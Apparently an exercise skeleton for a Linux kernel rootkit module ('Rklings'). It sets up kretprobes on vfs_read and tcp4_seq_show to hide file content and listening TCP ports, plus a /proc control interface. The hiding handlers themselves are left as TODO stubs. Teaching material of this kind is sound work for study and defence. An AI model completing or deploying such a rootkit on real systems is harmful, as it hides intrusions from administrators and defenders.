// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/sched/signal.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <net/inet_sock.h>
#include <net/sock.h>
#include <net/tcp.h>

#include "target_list.h"

#define RK_BUF_MAX 4080
#define RK_CMD_MAX 128

static struct rk_target_list content_targets;
static struct rk_target_list port_targets;
static struct proc_dir_entry *proc_entry;

/* --- vfs_read content hiding --- */

struct rk_read_data {
	char __user *buffer;
	unsigned char scratch[RK_BUF_MAX];
};

// TODO: rk_remove_matching_lines (filter lines matching content_targets)

static int rk_read_entry(struct kretprobe_instance *inst,
			  struct pt_regs *regs)
{
	struct rk_read_data *data = (void *)inst->data;

	data->buffer = (char __user *)regs_get_kernel_argument(regs, 1);
	return 0;
}

// TODO: rk_read_return (vfs_read kretprobe return handler)

static struct kretprobe read_probe = {
	.kp.symbol_name = "vfs_read",
	.entry_handler = rk_read_entry,
	// TODO: set .handler to your return handler
	.data_size = sizeof(struct rk_read_data),
	.maxactive = 32,
};

/* --- tcp4_seq_show port hiding --- */

struct rk_tcp_data {
	struct seq_file *seq;
	size_t prev_count;
};

// TODO: rk_tcp_show_entry (check port against port_targets, save seq)

// TODO: rk_tcp_show_return (rewind seq->count if entry matched)

static struct kretprobe tcp_probe = {
	.kp.symbol_name = "tcp4_seq_show",
	// TODO: set .entry_handler and .handler
	.data_size = sizeof(struct rk_tcp_data),
	.maxactive = 8,
};

/* --- kernel-space enumeration --- */

// TODO: rk_show_processes (walk task list, output pid/uid/comm)

// TODO: rk_show_ports (enumerate listening TCP sockets)

/* --- /proc/rklings interface --- */

static int rk_show(struct seq_file *out, void *unused)
{
	unsigned long flags;
	unsigned int i;

	seq_puts(out, "content_targets:\n");
	spin_lock_irqsave(&content_targets.lock, flags);
	for (i = 0; i < content_targets.count; i++)
		seq_printf(out, "  [%u] %s\n", i, content_targets.entries[i]);
	spin_unlock_irqrestore(&content_targets.lock, flags);

	seq_puts(out, "port_targets:\n");
	spin_lock_irqsave(&port_targets.lock, flags);
	for (i = 0; i < port_targets.count; i++)
		seq_printf(out, "  [%u] %s\n", i, port_targets.entries[i]);
	spin_unlock_irqrestore(&port_targets.lock, flags);

	// TODO: call rk_show_processes(out) and rk_show_ports(out) here
	return 0;
}

static int rk_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_show, NULL);
}

// TODO: rk_write (parse hide/unhide commands from proc)

static const struct proc_ops rk_proc_ops = {
	.proc_open = rk_open,
	.proc_read = seq_read,
	// TODO: set .proc_write
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};

/* --- init/exit --- */

// TODO: rk_init

// TODO: rk_exit

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings content/port hiding and kernel enumeration");
